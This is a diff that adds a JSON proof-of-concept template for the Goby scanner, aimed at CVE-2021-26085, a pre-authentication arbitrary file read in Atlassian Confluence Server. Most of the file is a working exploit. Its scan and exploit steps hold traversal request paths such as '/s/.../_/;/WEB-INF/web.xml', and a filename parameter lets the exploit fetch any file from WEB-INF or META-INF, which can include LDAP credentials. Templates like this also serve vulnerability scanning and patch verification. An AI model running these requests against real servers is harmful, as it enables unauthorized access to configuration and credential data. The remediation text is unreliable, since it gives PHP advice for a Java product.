@@ -1,0 +1,103 @@
+{
+      "Name": "atlassian-confluence-cve-2021-26085-arbitrary-file-read",
+      "Level": "3",
+      "Tags": [],
+      "GobyQuery": "product=\"Confluence\"",
+      "Description": "Atlassian Confluence Server 7.5.1 版存在预授权任意文件读取漏洞。\n未经认证的攻击者可访问Confluence的WEB-INF和META-INF目录下的任意文件（包括可能的凭据信息）。这个漏洞我理解是CVE-2020-29448补丁的绕过；跟CVE-2019-3394的危害程度一样，最大可能的危害是读取可能存在的atlassian-user.xml文件（泄露LDAP凭据但这种配置方式已被弃用），但是不需要认证。",
+      "Product": "Confluence",
+      "Homepage": "https://www.atlassian.com/",
+      "Author": "york",
+      "Impact": "<p>1.php中可以使用open_basedir配置限制访问权限在指定区域。<br></p><p>2.过滤 . (点) / (斜杠) \\ (反斜杠)。</p><p>3.禁止服务器远程文件包含。</p>",
+      "Recommendation": "<p>Atlassian Confluence Server 7.5.1 版存在预授权任意文件读取漏洞 ,升级版本.</p>",
+      "References": [
+            "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202108-109"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "filename",
+                  "Type": "input",
+                  "Value": "/WEB-INF/web.xml"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/s/6f1274579a/_/;/WEB-INF/web.xml",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "web-app",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "web-app_",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/s/123cfx/_/;{{{filename}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "PostTime": "2022-01-06 10:00:31",
+      "GobyVersion": "1.9.314"
+}
